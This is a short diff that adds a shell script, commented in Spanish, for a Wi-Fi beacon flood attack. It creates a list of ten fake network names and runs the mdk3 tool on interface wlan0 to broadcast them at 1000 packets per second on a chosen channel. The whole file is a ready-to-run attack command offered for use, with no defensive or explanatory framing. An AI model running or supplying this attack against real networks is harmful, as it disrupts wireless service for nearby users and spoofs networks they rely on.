@@ -1,0 +1,6 @@
+#Ataque Beacon Flood Mode
+for i in $(seq 1 10); do echo "MyNetwork$i"; done
+for i in $(seq 1 10); do echo "MyNetwork$i" >> redes.txt; done
+
+mdk3 wlan0 b -f redes.txt -a -s 1000 -c 1 
+#Numero de canal que quieras en -c 
